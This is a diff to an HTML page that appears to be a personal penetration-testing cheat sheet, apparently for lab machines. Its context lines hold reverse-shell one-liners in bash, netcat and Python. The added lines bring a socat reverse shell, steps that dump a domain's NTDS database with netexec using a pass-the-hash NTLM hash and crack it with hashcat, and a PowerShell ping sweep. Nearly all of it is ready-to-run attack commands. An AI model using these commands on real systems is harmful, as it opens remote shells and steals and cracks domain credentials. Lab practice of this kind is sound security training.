@@ -93,6 +93,8 @@ ncat -nv --source-port 53 10.129.2.28 50000 #Then connect to the port</code></pr
                         <pre><code class="language-bash">bash -i >& /dev/tcp/TU_IP/TU_PUERTO 0>&1</code></pre>
                         <pre><code class="language-bash">nc -e /bin/sh 10.0.0.1 1234</code></pre>
                         <pre><code class="language-bash">bash -c "bash -i >& /dev/tcp/10.10.14.18/4444 0>&1"</code></pre>
+                        <h2>Socat</h2>
+                        <pre><code class="language-bash">socat TCP:10.10.14.124:4445 EXEC:sh</code></pre>
                         <h2>Python</h2>
                         <pre><code class="language-python">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234))</code></pre>
                         <h2>PHP</h2>
@@ -517,6 +519,23 @@ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPqRDQ0mTYDYnx0cJOUWyNGGrhhjYddfIIoO9H
             </div>
 
             <div class="notion-header">
+                <h1 id="DPAT usage">DPAT usage</h1>
+            </div>   
+            <div class="banner">
+                <ul>
+                        <p>DPAT is a software which analyze NTDS cracked dumps and display some stats. It's worth using it once you compromised the domain. To use it follow the steps</p>
+                        <p>Export the NTDS file we can do so with netexec or secretsdump</p>
+                        <pre><code class="language-bash">netexec smb 172.16.8.3 -u Administrator -H fd1f7e5564060258ea787ddbb6e6afa2 -M ntdsutil</code></pre>
+                        <p>The location of the file can be seen at the end of netexec output</p>
+                        <p>Then crack the file using hashcat and output it's content into a new file</p>
+                        <pre><code class="language-bash">hashcat -m 1000 dump.ntds /usr/share/wordlists/rockyou.txt --potfile-disable -o cracked.txt</code></pre>
+                        <p>Then pass it to DPAT. Have in mind that you may need a python environment</p>
+                        <pre><code class="language-bash">python3 dpat.py -n /home/kali/.nxc/logs/ntds/dump.ntds -c /home/kali/.nxc/logs/ntds/cracked.txt -p 8</code></pre>
+                        <p>Then pres <b>y</b> to generate a report</p>
+                </ul>    
+            </div>
+
+            <div class="notion-header">
                 <h1 id="Pivoting Ligolo">Pivoting Ligolo</h1>
             </div>   
             <div class="banner">
@@ -603,17 +622,17 @@ sudo ip route add 172.16.10.0/24 dev ligolo-triple</code></pre>
                         <b>Linux</b>
                         <pre><code class="language-bash">for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done</code></pre>
                         <b>Windows</b>        
-                        <pre><code class="language-bash">$network = "172.16.5"
+                        <pre><code class="language-bash">$network = "172.16.9"
 1..254 | ForEach-Object {
-    $ip = "172.16.10.$_"
+    $ip = "$network.$_"
     Write-Host "[*] Pingeando $ip ..." -NoNewline
-    if (Test-Connection -ComputerName $ip -Count 1 -Quiet -ErrorAction SilentlyContinue) {
+
+    $result = ping -n 1 -w 100 $ip | Select-String "TTL="
+
+    if ($result) {
         Write-Host "  UP" -ForegroundColor Green
-    } else {
-        Write-Host "  DOWN" -ForegroundColor DarkGray
-    }
-}
-</code></pre>        
+    } 
+}</code></pre>        
                     <b>Wireshark</b>
                     <p>Filtering by arp in wireshark and waiting a little bit allow us to identify hosts</p>
                     <b>fping</b>
